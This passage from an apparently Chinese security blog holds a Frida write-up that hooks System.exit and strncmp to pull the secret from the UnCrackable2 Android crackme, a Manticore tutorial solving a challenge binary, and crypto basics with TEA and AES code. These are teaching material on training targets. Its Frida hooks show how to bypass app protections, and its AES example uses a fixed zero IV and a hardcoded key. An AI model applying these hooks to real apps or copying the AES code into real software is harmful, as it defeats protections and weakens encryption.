<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ frida -U -f sg.vantagepoint.uncrackable2 -l uncrackable2.js --no-pause</span><br><span class="line">...</span><br><span class="line">Spawned &#96;sg.vantagepoint.uncrackable2&#96;. Resuming main thread!</span><br><span class="line">[*] Starting script</span><br><span class="line">[USB::Android Emulator 5554::[&#39;sg.vantagepoint.uncrackable2&#39;]]-&gt; [*] Hooking calls to System.exit</span><br><span class="line">[*] System.exit called</span><br></pre></td></tr></table></figure>
<p>等到出现<code>[*] Hooking calls to System.exit</code>，点击OK，程序就不会退出了。<br><img src="/images/frida/uncrackable2.png"><br>程序需要输入一个字符串，需要继续分析MainActivity：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.m = <span class="keyword">new</span> CodeCheck();</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.m.a(string)) &#123;</span><br><span class="line">    Dialog.setTitle((CharSequence)<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">    Dialog.setMessage((CharSequence)<span class="string">&quot;This is the correct secret.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看看CodeCheck类：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> sg.vantagepoint.uncrackable2;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CodeCheck</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">boolean</span> <span class="title">bar</span><span class="params">(<span class="keyword">byte</span>[] var1)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">a</span><span class="params">(String string)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.bar(string.getBytes());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输入的字符串被传递给一个native方法bar，同样在libfoo.so中找到这个函数：<br><img src="/images/frida/codecheck.png"><br>看到0xb52处的汇编代码  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x00000b52      83f817         cmp eax, 0x17</span><br><span class="line">0x00000b55      7515           jne 0xb6c</span><br></pre></td></tr></table></figure>
<p>这里有一个eax和0x17的比较，如果不相同，strncmp函数不会调用，0x17是strncmp的一个参数。可以猜测输入的字符串长度应该是0x17。尝试hook strncmp，打印它的参数，会发现strncmp被调用了很多次，需要进一步限制输出。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">var strncmp &#x3D; undefined;</span><br><span class="line">imports &#x3D; Module.enumerateImportsSync(&quot;libfoo.so&quot;);</span><br><span class="line"></span><br><span class="line">for (i &#x3D; 0; i &lt; imports.length; i++) &#123;</span><br><span class="line">    if (imports[i].name &#x3D;&#x3D; &quot;strncmp&quot;) &#123;</span><br><span class="line">        strncmp &#x3D; imports[i].address;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Interceptor.attach(strncmp, &#123;</span><br><span class="line">    onEnter: function(args) &#123;</span><br><span class="line">        if (args[2].toInt32() &#x3D;&#x3D; 23 &amp;&amp; Memory.readUtf8String(args[0], 23) &#x3D;&#x3D; &quot;01234567890123456789012&quot;) &#123;</span><br><span class="line">            console.log(&quot;[*] Secret string at &quot; + args[1] + &quot;: &quot; + Memory.readUtf8String(args[1], 23));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>1.该脚本调用<code>Module.enumerateImportsSync()</code>以从libfoo.so中获取有关导入信息的对象数组。我们遍历这个数组，直到找到strncmp并检索其地址。然后我们将<code>Interceptor</code>附加到它。<br>2.Java中的字符串不会以null结束。当strncmp使用frida的<code>Memory.readUtf8String</code>方法访问字符串指针的内存位置并且不提供长度时，frida会期待一个<code>\0</code>结束符，或者输出一些垃圾内存。它不知道字符串在哪里结束。如果我们指定要读取的字符数量作为第二个参数就解决了这个问题。<br>3.如果我们没有限制strncmp参数的条件将得到很多输出。限制条件为第三个参数size_t为23。<br>如何知道args[0]是我们的输入，args[1]是我们寻找的字符串，这个是试出来的。<br>启动frida加载这个脚本：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f sg.vantagepoint.uncrackable2 -l uncrackable2.js --no-pause</span><br><span class="line">...</span><br><span class="line">Spawned &#96;sg.vantagepoint.uncrackable2&#96;. Resuming main thread!</span><br><span class="line">[*] Starting script</span><br><span class="line">[USB::Android Emulator 5554::[&#39;sg.vantagepoint.uncrackable2&#39;]]-&gt; [*] Hooking calls to System.exit</span><br><span class="line">[*] Intercepting strncmp</span><br><span class="line">[*] System.exit called</span><br><span class="line">[*] Secret string at 0x7fff9553d870: thanks for all the fish</span><br></pre></td></tr></table></figure>
<p>输入字符串”01234567890123456789012”按VERIFY，终端会显示正确答案：Thanks for all the fish<br><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://bobao.360.cn/learning/detail/3794.html">利用FRIDA攻击Android应用程序（三）</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/06/04/Frida%E8%A7%A3%E5%86%B3Android-Crackme2/" data-id="ckhe7o4lb0021chl7164vfxah" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Android/" rel="tag">Android</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Manticore：符号执行" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/06/01/Manticore%EF%BC%9A%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/" class="article-date">
  <time datetime="2017-05-31T16:39:46.000Z" itemprop="datePublished">2017-06-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/06/01/Manticore%EF%BC%9A%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/">Manticore：符号执行</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Manticore是一个用python开发的用来进行动态二进制分析的开源工具，可以帮助我们快速地利用符号执行、污点分析和插桩来分析二进制。<br>Manticore有一个命令行工具，可以用符号执行来产生程序的测试用例，当运行程序时，每个测试用例会产生不同的输出结果，例如一个普通的退出或一个崩溃。<br>命令行工具可以满足一些应用场景，但是实际的使用更加灵活，可以使用它提供的Python API来自定义分析和根据应用进行优化。Manticore API可以：</p>
<ul>
<li>舍弃无关紧要的状态</li>
<li>在任意执行点运行自定义分析函数</li>
<li>具体化符号内存</li>
<li>内省和修改模拟的机器状态</li>
</ul>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>1.安装系统依赖  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get update &amp;&amp; sudo apt-get install z3 python-pip -y</span><br><span class="line">$ python -m pip install -U pip</span><br></pre></td></tr></table></figure>
<p>2.安装manticore  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;trailofbits&#x2F;manticore.git &amp;&amp; cd manticore</span><br><span class="line">$ sudo pip install .</span><br></pre></td></tr></table></figure>
<p>3.例子  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd examples&#x2F;linux</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure>
<p>命令行工具：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ manticore basic</span><br><span class="line">$ cat mcore_8PZ_Lo&#x2F;test_00000001.stdin| .&#x2F;basic</span><br><span class="line">Message: It is less than or equal to 0x41</span><br><span class="line">$ cat mcore_8PZ_Lo&#x2F;test_00000002.stdin| .&#x2F;basic</span><br><span class="line">Message: It is greater than 0x41</span><br></pre></td></tr></table></figure>
<p>Manticore API：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cd ..&#x2F;script</span><br><span class="line">python count_instructions.py ..&#x2F;linux&#x2F;helloworld</span><br><span class="line">Executed  6897  instructions.</span><br></pre></td></tr></table></figure>

<h2 id="实验例子"><a href="#实验例子" class="headerlink" title="实验例子"></a>实验例子</h2><p>下面是<a target="_blank" rel="noopener" href="https://github.com/trailofbits/manticore/raw/master/examples/linux/binaries/multiple-styles">multiple-styles</a>的writeup。<br>用IDA反汇编multiple-styles的main函数如下：<br><img src="/images/symexe/multiple-styles.png"><br>看到程序可能输出”sounds fake but ok”或”you got it!”，猜测后者是正确输入后的结果。代码逻辑比较简单，目的是对manticore有一个初步了解。<br>如果我们执行命令<code>manticore multiple-styles</code>，manticore将会开始自动分析二进制文件，最终会得出到达所有代码路径的输入，但是这会花费大量时间。通过部分人工分析，可以写出优化的脚本。</p>
<h3 id="插桩解决方法"><a href="#插桩解决方法" class="headerlink" title="插桩解决方法"></a>插桩解决方法</h3><p>解决方法脚本如下：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> manticore <span class="keyword">import</span> Manticore</span><br><span class="line"></span><br><span class="line">m = Manticore(<span class="string">&#x27;./multiple-styles&#x27;</span>) <span class="comment"># 加载二进制文件</span></span><br><span class="line">m.context[<span class="string">&#x27;flag&#x27;</span>] = <span class="string">&quot;&quot;</span> <span class="comment"># 在manticore的context字典中创建一个flag条目，在这里存储flag，可以在不同的hook之间访问</span></span><br><span class="line"><span class="comment"># 下面创建一些hook，hook告诉manticore在执行指定地址的指令之前挂起程序，先执行我们的代码，然后继续执行</span></span><br><span class="line"><span class="meta">@m.hook(0x400a3b) # 当指令运行到指定地址时，运行下面函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook</span>(<span class="params">state</span>):</span></span><br><span class="line">    cpu = state.cpu</span><br><span class="line">    m.context[<span class="string">&#x27;flag&#x27;</span>] += <span class="built_in">chr</span>(cpu.AL - <span class="number">10</span>) <span class="comment"># flag的值存在EAX的最低字节AL中</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@m.hook(0x400a3e)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook2</span>(<span class="params">state</span>):</span></span><br><span class="line">    cpu = state.cpu</span><br><span class="line">    cpu.ZF = <span class="literal">True</span> <span class="comment"># 设置zero flag为True，使得不管字符是否匹配都能到下一轮</span></span><br><span class="line"><span class="comment"># 下面两个hook只是打印flag</span></span><br><span class="line"><span class="meta">@m.hook(0x400a40)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hookf</span>(<span class="params">state</span>):</span></span><br><span class="line">    print(<span class="string">&quot;Failed&quot;</span>)</span><br><span class="line">    m.terminate()</span><br><span class="line"></span><br><span class="line"><span class="meta">@m.hook(0x400a6c)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hooks</span>(<span class="params">state</span>):</span></span><br><span class="line">    print(<span class="string">&quot;Success!&quot;</span>)</span><br><span class="line">    print(m.context[<span class="string">&#x27;flag&#x27;</span>])</span><br><span class="line">    m.terminate()</span><br><span class="line"><span class="comment"># 设置m.concrete_data为17字节的填充，传入stdin</span></span><br><span class="line">m.concrete_data = <span class="string">&quot;12345678&quot;</span> * <span class="number">2</span> + <span class="string">&quot;\n&quot;</span></span><br><span class="line">m.run()</span><br></pre></td></tr></table></figure>
<p>运行脚本：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python concrete.py </span><br><span class="line">Success!</span><br><span class="line">coldlikeminisodas</span><br></pre></td></tr></table></figure>

<h3 id="符号执行解决方法"><a href="#符号执行解决方法" class="headerlink" title="符号执行解决方法"></a>符号执行解决方法</h3><p>理想的状态是不需要我们自己弄明白如何计算输入到stdin的值，这里的逆向非常容易，但是真实的问题不会这么简单，manticore的符号执行的能力使得我们可以让它来做这些工作。<br>解决方法脚本如下：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> manticore <span class="keyword">import</span> Manticore</span><br><span class="line"></span><br><span class="line">m = Manticore(<span class="string">&#x27;./multiple-styles&#x27;</span>)</span><br><span class="line">m.context[<span class="string">&#x27;flag&#x27;</span>] = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@m.hook(0x400a6c) # success的地址</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook</span>(<span class="params">state</span>):</span></span><br><span class="line">    cpu = state.cpu</span><br><span class="line">    transform_base = cpu.RBP - <span class="number">0x50</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">        solved = state.solve_one(cpu.read_int(transform_base + i, <span class="number">8</span>))</span><br><span class="line">        print(solved)</span><br><span class="line">        m.context[<span class="string">&#x27;flag&#x27;</span>] += <span class="built_in">chr</span>(solved)</span><br><span class="line">    print(m.context[<span class="string">&#x27;flag&#x27;</span>])</span><br><span class="line">    m.terminate()</span><br><span class="line"></span><br><span class="line">m.run()</span><br></pre></td></tr></table></figure>
<p>这种解决方法为manticore指定一个目的地址，然后帮它找到如何到达这里。通过分析二进制，它会从stdin读取值到位于<code>RBP-0x50</code>的<code>buffer</code>，我们把这个地址保存在变量<code>transform_base</code>中。然后循环<code>buffer</code>里的每一个字节，告诉manticore给这个字节找到一个值，能让我们到达当前地址。将找到的值一个个加入到flag中。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python symbolic.py   </span><br><span class="line">...</span><br><span class="line">coldlikeminisodas</span><br></pre></td></tr></table></figure>
<p>我们像可编程调试器一样使用manticore，修改循环所以它不会出错。我们为manticore标记hook的指令为success状态，<code>state.solve_one</code>操作使用z3来解决限制。限制的建立是通过检查程序剩余部分，找出需要填在内存<code>transform_base+i</code>中的值，使得我们能够到达当前状态。<br><strong>reference</strong><br><a target="_blank" rel="noopener" href="https://blog.trailofbits.com/2017/04/27/manticore-symbolic-execution-for-humans/">Manticore: Symbolic execution for humans</a><br><a target="_blank" rel="noopener" href="https://gist.github.com/ehennenfent/a5ad9746615d1490c618a88b98769c10">Multiple Styles: The Writeup</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/06/01/Manticore%EF%BC%9A%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/" data-id="ckhe7o4ly0039chl72vh414h6" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Symbolic-Execution/" rel="tag">Symbolic Execution</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-密码学基础" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/05/20/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/" class="article-date">
  <time datetime="2017-05-20T15:36:45.000Z" itemprop="datePublished">2017-05-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/05/20/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/">密码学基础</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="加密算法分类"><a href="#加密算法分类" class="headerlink" title="加密算法分类"></a>加密算法分类</h3><p><strong>根据密钥数量</strong></p>
<ul>
<li>对称加密：加解密使用相同密钥。基于复杂的非线性变换与迭代运算实现安全性。（DES、AES）</li>
<li>非对称加密：加密使用公钥，解密使用私钥。基于某个数学难题实现安全性。（RSA）</li>
</ul>
<p><strong>根据加密方式</strong></p>
<ul>
<li>分组密码：一次处理一个输入块，并产生一个对应的输出块，一个明文分组被作为一个整体来产生一个等长的密文分组，通常使用的分组为64bit或者128bit。（DES、AES）</li>
<li>序列密码：一次只处理一个字节或一个位。（RC4）</li>
</ul>
<h3 id="TEA加密实现"><a href="#TEA加密实现" class="headerlink" title="TEA加密实现"></a>TEA加密实现</h3><p>TEA加密是一种分组密码算法，其分组长度为64bit，密钥长度为128bit。TEA算法利用不断增加的Delta(黄金分割率)值作为变化，使得每轮的加密是不同，该加密算法的迭代次数可以改变，建议的迭代次数为32轮。  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> key[<span class="number">16</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 扰乱函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">scramble</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> k[], <span class="keyword">unsigned</span> <span class="keyword">int</span> t[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> t0 = t[<span class="number">0</span>], t1 = t[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> n, sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (n = <span class="number">0</span>; n &lt; <span class="number">32</span>; n++) &#123;</span><br><span class="line">        sum += DELTA;</span><br><span class="line">        t0 += ((t1 &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>]) ^ (t1 + sum) ^ ((t1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]);</span><br><span class="line">        t1 += ((t0 &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (t0 + sum) ^ ((t0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    t[<span class="number">0</span>] = t0; t[<span class="number">1</span>] = t1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> k[], <span class="keyword">char</span> *buf, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i++)</span><br><span class="line">        scramble(k, (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(buf + (i * <span class="number">8</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 解扰函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">descramble</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> k[], <span class="keyword">unsigned</span> <span class="keyword">int</span> t[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> t0 = t[<span class="number">0</span>], t1 = t[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> n, sum = DELTA &lt;&lt; <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">for</span> (n = <span class="number">0</span>; n &lt; <span class="number">32</span>; n++) &#123;</span><br><span class="line">        t1 -= ((t0 &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (t0 + sum) ^ ((t0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]);</span><br><span class="line">        t0 -= ((t1 &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>]) ^ (t1 + sum) ^ ((t1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]);</span><br><span class="line">        sum -= DELTA;</span><br><span class="line">    &#125;</span><br><span class="line">    t[<span class="number">0</span>] = t0; t[<span class="number">1</span>] = t1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> k[], <span class="keyword">char</span> *buf, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i++)</span><br><span class="line">        descramble(k, (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(buf + (i * <span class="number">8</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *plain = <span class="string">&quot;Fuzzing consists of repeatedly testing an application with modified, or fuzzed input&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> text[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(key, <span class="string">&quot;this is a key&quot;</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(text, plain);</span><br><span class="line"></span><br><span class="line">    encrypt((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)key, text, <span class="keyword">sizeof</span>(text));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;encrypt text: %s\n&quot;</span>, text);</span><br><span class="line">    decrypt((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)key, text, <span class="keyword">sizeof</span>(text));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;decrypt text: %s\n&quot;</span>, text);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="pycrypto中的加密算法"><a href="#pycrypto中的加密算法" class="headerlink" title="pycrypto中的加密算法"></a>pycrypto中的加密算法</h3><p>1.安装方式：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo pip install pycrypto</span><br></pre></td></tr></table></figure>
<p>2.pycrypto模块是python中用来处理加密解密等信息安全相关的一个很重要模块。<br>该模块支持的加密方式：</p>
<ul>
<li>对称加密方式：AES、DES、RC4</li>
<li>散列值计算：MD5、SHA、HMAC</li>
<li>公钥加密和签名：RSA、DSA</li>
</ul>
<p>3.AES实现：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AESCrypto</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, key</span>):</span></span><br><span class="line">        self.key = key</span><br><span class="line">        self.mode = AES.MODE_CBC</span><br><span class="line">        self.iv = <span class="string">&quot;0&quot;</span> * <span class="number">16</span> <span class="comment"># 默认iv是16个0（这个称为初始化向量），由于是分组加密，所以下一组的iv，就用前一组的加密的密文来充当</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">aesencrypt</span>(<span class="params">self, text</span>):</span></span><br><span class="line">        cryptor = AES.new(self.key, self.mode, self.iv)</span><br><span class="line">        ciphertext = cryptor.encrypt(text.ljust(<span class="number">16</span>))</span><br><span class="line">        <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">aesdecrypt</span>(<span class="params">self, text</span>):</span></span><br><span class="line">        decryptor = AES.new(self.key, self.mode, self.iv)</span><br><span class="line">        plaintext = decryptor.decrypt(text)</span><br><span class="line">        <span class="keyword">return</span> plaintext.rstrip(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    mycrypt = AESCrypto(<span class="string">&#x27;thisisakeyyyyyyy&#x27;</span>)</span><br><span class="line">    e = mycrypt.aesencrypt(<span class="string">&quot;hello,world!&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> e</span><br><span class="line">    d = mycrypt.aesdecrypt(e)</span><br><span class="line">    <span class="built_in">print</span> d</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/05/20/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/" data-id="ckhe7o4nk005vchl7b78jc5oy" class="article-share-link">Share</a>
      
      
